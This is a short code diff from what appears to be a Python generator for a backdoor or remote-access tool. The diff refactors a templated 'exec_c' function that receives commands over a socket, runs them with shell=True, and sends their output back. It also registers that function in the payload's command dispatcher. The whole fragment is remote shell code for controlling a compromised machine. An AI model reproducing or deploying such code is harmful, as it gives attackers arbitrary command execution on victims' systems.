@@ -17,12 +17,12 @@ def exec_c(execute):
     if execute[:3] == 'cd ':
         execute = execute.replace('cd ', '', 1)
         chdir(execute)
-        s.sendall(("[+]Changed to directory : " + execute).encode())
+        main_send("[+]Changed to directory : " + execute, s)
     else:
         result = Popen(execute, shell=True, stdout=PIPE, stderr=PIPE,
                        stdin=PIPE)
-        result = result.stdout.read() + result.stderr.read()        
-        s.sendall(('[+]Command output : \\n' + result.decode()).encode())''')
+        result = result.stdout.read() + result.stderr.read()
+        main_send('[+]Command output : \\n' + result.decode(), s)''')
         config.logics.append('''
             elif command == "exec_c":
                 exec_c(data)''')
